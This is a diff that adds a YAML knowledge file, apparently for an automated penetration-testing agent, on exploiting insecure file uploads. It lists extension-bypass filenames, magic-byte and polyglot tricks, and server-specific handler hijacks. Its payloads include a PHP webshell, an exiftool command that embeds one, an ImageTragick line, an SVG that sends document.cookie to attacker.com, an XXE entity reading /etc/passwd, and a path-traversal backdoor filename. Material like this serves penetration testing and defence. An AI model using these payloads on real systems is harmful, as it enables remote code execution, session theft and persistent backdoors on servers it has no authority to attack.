@@ -1,0 +1,204 @@
+name: insecure_file_uploads
+description: Insecure file upload exploitation — extension bypass, content-type abuse, and upload-to-RCE chains
+techniques:
+  - "Extension validation bypass"
+  - "Content-Type and magic byte spoofing"
+  - "Server-specific upload exploitation"
+  - "Filename injection and path traversal via upload"
+  - "Polyglot and image-based payload delivery"
+  - "Race condition upload exploitation"
+tools:
+  - httpx
+  - curl
+  - nuclei
+  - browser_navigate
+  - ffuf
+knowledge: |
+  Insecure file upload occurs when an application accepts user-uploaded files without
+  adequate validation of type, content, name, or storage location. The goal is to upload
+  executable content that the server will interpret — turning file storage into code execution.
+
+  ## Extension Bypass Arsenal:
+
+  When the app restricts file extensions, systematically probe the filter:
+  - **Double extension**: `shell.php.jpg`, `shell.asp.png` — if server resolves type
+    by first extension or if Apache processes .php anywhere in filename
+  - **Null byte truncation**: `shell.php%00.jpg` — older systems (PHP < 5.3.4)
+    truncate at null byte; server sees .jpg, filesystem saves .php
+  - **Case variation**: `.pHp`, `.PhP`, `.PHP` — case-insensitive match on Windows/IIS
+    but case-sensitive filter may miss uppercase variants
+  - **Alternative PHP extensions**: `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`,
+    `.pht`, `.phps`, `.phar` — all may be configured as PHP handlers
+  - **Alternative ASP extensions**: `.asa`, `.cer`, `.cdx`, `.ashx`, `.asmx`, `.aspx`
+  - **Alternative JSP extensions**: `.jspx`, `.jsw`, `.jsv`, `.jspf`
+  - **Server-side includes**: `.shtml`, `.stm`, `.shtm` — SSI execution
+  - **Trailing characters**: `shell.php.` (trailing dot), `shell.php ` (trailing space),
+    `shell.php::$DATA` (NTFS alternate data stream) — Windows may strip these
+  - **Semicolon trick (IIS)**: `shell.asp;.jpg` — IIS stops parsing at semicolon,
+    executes as ASP while filter sees .jpg extension
+  - **URL encoding in extension**: `shell.ph%70` → decodes to `shell.php` at filesystem
+    level if server doesn't normalize before validation
+  - **Whitelist bypass**: If whitelist allows `.jpg`, check if `.jpg.php` or
+    `.php%00.jpg` passes — filter logic matters (endsWith vs regex vs contains)
+
+  ## Content-Type and Magic Byte Bypass:
+
+  Separate from extension validation — targets MIME type and file content checks:
+  - **MIME type in request**: Change `Content-Type: application/x-php` to
+    `Content-Type: image/jpeg` in multipart upload — server may trust the header
+  - **Magic bytes prepend**: Add file signature before payload:
+    - `GIF89a;<?php system($_GET['c']); ?>` — passes GIF magic byte check
+    - `\xFF\xD8\xFF` prefix for JPEG + payload in comment section
+    - `\x89PNG\r\n\x1a\n` prefix for PNG
+    - `%PDF-1.4` prefix for PDF
+  - **Polyglot files**: Files that are simultaneously valid images AND executable code:
+    - GIFAR: GIF + JAR archive — valid GIF that's also valid Java archive
+    - PNG + PHP: Valid PNG with PHP code in metadata chunks
+    - BMP + HTML: BMP header followed by HTML/JS content
+  - **Content sniffing**: Some servers/browsers sniff content regardless of
+    Content-Type — upload HTML as .jpg, browser may render HTML if Content-Type
+    is not explicitly set by server or X-Content-Type-Options: nosniff is missing
+  - **Double Content-Type**: Send two Content-Type headers — server may validate
+    first but use second for processing
+
+  ## Server-Specific Exploitation:
+
+  Each server has unique file handling behavior — adapt your approach:
+
+  **Apache**:
+  - `.htaccess` upload: If you can upload to webroot, upload `.htaccess` containing
+    `AddType application/x-httpd-php .jpg` — now ALL .jpg files execute as PHP
+  - `AddHandler php-script .txt` — makes .txt files execute as PHP
+  - Apache resolves MIME type by rightmost recognized extension: `shell.php.blah`
+    may execute as PHP if .blah is unknown but .php is recognized
+
+  **Nginx**:
+  - Path info vulnerability: Upload `image.jpg` containing PHP, access as
+    `/uploads/image.jpg/.php` — if Nginx passes .php to PHP-FPM and
+    cgi.fix_pathinfo=1, PHP executes the image as code
+  - Alias traversal: Misconfigured `alias` directives may allow accessing
+    files outside upload directory
+
+  **IIS**:
+  - `web.config` upload: XML configuration that can map arbitrary extensions to
+    ASP.NET handler — upload web.config that maps .jpg to ASP handler
+  - Semicolon parsing: `shell.asp;.jpg` executes as ASP
+  - `.cer` files: Often mapped to ASP execution
+  - Short filename (8.3): `SHELL~1.PHP` may bypass long filename filters
+
+  **Tomcat**:
+  - `.war` deployment: If management interface accessible, deploy WAR file
+    containing JSP webshell
+  - `.jsp` in WEB-INF: Upload JSP via path traversal into application directory
+
+  ## Filename Injection and Storage Attacks:
+
+  The filename itself is an attack vector — not just the content:
+  - **Path traversal in filename**: Set filename to `../../webroot/shell.php` in
+    multipart form data — if server uses filename to construct storage path
+    without sanitization, file lands in webroot
+  - **Overwrite critical files**: Upload file named `.htaccess`, `web.config`,
+    `index.php`, or `__init__.py` to overwrite server configuration
+  - **Special characters**: Filenames with `;`, `|`, `$()`, backticks — if
+    filename is passed to shell commands (thumbnail generation, virus scan),
+    these may trigger command injection
+  - **Long filename**: Exceed filesystem limits (255 chars) — truncation may
+    remove extension validation that was appended
+  - **Dot-dot filename**: `..` as filename may cause directory confusion
+  - **Reserved names (Windows)**: `CON`, `PRN`, `AUX`, `NUL`, `COM1-9`, `LPT1-9`
+    — uploading these names can cause server errors or denial of service
+
+  ## Image-Specific Attack Vectors:
+
+  Image processing libraries introduce additional attack surface:
+  - **EXIF metadata injection**: Embed PHP code in EXIF comment field — if image
+    is processed by include/require, code executes:
+    `exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg`
+  - **SVG with JavaScript**: SVGs are XML-based and can contain:
+    `<svg onload="alert(document.cookie)">` — XSS when SVG is served inline
+  - **SVG with XXE**: SVG files can include external entity declarations:
+    `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
+  - **ImageMagick exploits (ImageTragick)**: If server uses ImageMagick for
+    processing, craft MVG/SVG with command injection:
+    `push graphic-context viewbox 0 0 640 480 fill 'url(https://attacker.com/x.jpg"|id")'`
+  - **Image resizing DoS**: Upload pixel bomb (tiny file, huge dimensions) —
+    server OOM during resize operation (decompression bomb)
+  - **Steganography**: Hide payload in pixel data — survives image processing
+    but requires secondary retrieval mechanism
+
+  ## Race Condition Exploitation:
+
+  Timing gap between upload and validation creates exploitation windows:
+  - **Upload → access before AV scan**: Upload webshell, immediately request it
+    before antivirus scan completes and deletes it
+  - **Upload → access before rename**: If server renames files after upload
+    (e.g., adds hash prefix), access with original name during gap
+  - **Upload → access before move**: File may be accessible in temp directory
+    before being moved to final (non-executable) location
+  - **Concurrent upload + access**: Send upload and execution requests simultaneously
+    across many threads — increases chance of hitting the timing window
+
+  Testing technique: Upload file in one thread, continuously request the uploaded
+  file URL in parallel thread with sub-100ms retry. Tools: Turbo Intruder,
+  custom script with async HTTP client.
+
+  ## Storage and Retrieval Considerations:
+
+  How the application serves uploaded files affects exploitability:
+  - **Same-origin serving**: Files served from app domain = full cookie access
+    for XSS via uploaded HTML/SVG
+  - **CDN/blob storage**: S3, Azure Blob — may serve with permissive CORS or
+    without Content-Disposition: attachment
+  - **Missing Content-Disposition**: Without `attachment` header, browser renders
+    uploaded HTML/SVG inline → XSS
+  - **Missing X-Content-Type-Options**: Without `nosniff`, browser may MIME-sniff
+    uploaded content and render as HTML despite .txt extension
+  - **Direct filesystem path**: File accessible via predictable URL =
+    no access control on uploaded files
+  - **Signed URL bypass**: If signed URLs expire, check if direct path also works
+
+  ## Chaining Patterns:
+
+  File upload vulnerabilities are stepping stones to deeper compromise:
+  - **Upload → webshell → RCE → reverse shell → lateral movement**
+  - **Upload HTML → stored XSS → session hijack → account takeover**
+  - **Upload .htaccess → rewrite rules → internal proxy → SSRF**
+  - **Upload SVG → XXE → internal file read → credential theft**
+  - **Upload config file → server reconfiguration → arbitrary code execution**
+  - **Upload + path traversal → overwrite app code → persistent backdoor**
+examples:
+  - title: "PHP Webshell with GIF Magic Bytes"
+    description: "Bypass content validation using GIF89a magic byte prefix"
+    payload: "Upload file named 'avatar.php.jpg' with content: GIF89a;<?php system($_GET['c']); ?>"
+    validation: "Access uploaded file with ?c=id — if 'uid=' appears in response, code execution confirmed"
+  - title: "Apache .htaccess Upload"
+    description: "Reconfigure Apache to execute JPG files as PHP"
+    payload: "Upload .htaccess containing: AddType application/x-httpd-php .jpg — then upload shell.jpg with PHP code"
+    validation: "Request shell.jpg — if PHP code executes instead of image rendering, Apache is processing it as PHP"
+  - title: "IIS Semicolon Extension Bypass"
+    description: "Exploit IIS semicolon parsing to bypass extension filter"
+    payload: "Upload file named 'cmd.asp;.jpg' containing ASP webshell code"
+    validation: "Access /uploads/cmd.asp;.jpg — IIS executes as ASP while upload filter saw .jpg"
+  - title: "SVG XSS Upload"
+    description: "Upload SVG containing JavaScript for stored XSS"
+    payload: "Upload: <svg xmlns='http://www.w3.org/2000/svg' onload='fetch(\"https://attacker.com/steal?\"+document.cookie)'></svg>"
+    validation: "When any user views the SVG, their cookies are exfiltrated to attacker server"
+  - title: "Path Traversal in Filename"
+    description: "Write uploaded file outside intended directory via crafted filename"
+    payload: "Set filename in multipart upload to: ../../../var/www/html/backdoor.php"
+    validation: "Access /backdoor.php at webroot — if it exists and executes, path traversal in filename succeeded"
+  - title: "Nginx Path Info PHP Execution"
+    description: "Exploit cgi.fix_pathinfo to execute uploaded image as PHP"
+    payload: "Upload normal image with embedded PHP in EXIF comment; access /uploads/image.jpg/.php"
+    validation: "If PHP code from EXIF executes, Nginx is passing .php pathinfo to PHP-FPM with fix_pathinfo enabled"
+validation_methods:
+  - "Upload file with unique canary string, then retrieve it to confirm upload storage location and accessibility"
+  - "Test extension filter by uploading the same payload with each alternative extension variant systematically"
+  - "Compare server behavior between Content-Type: image/jpeg (spoofed) and actual MIME type to identify which is trusted"
+  - "Upload benign file, note the URL pattern, then upload payload and access it at the predicted URL"
+  - "Check response headers on served uploads for Content-Disposition, X-Content-Type-Options, and Content-Type"
+  - "Monitor server-side file creation timestamps vs access times to measure race condition windows"
+references:
+  - "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
+  - "https://portswigger.net/web-security/file-upload"
+  - "https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html"
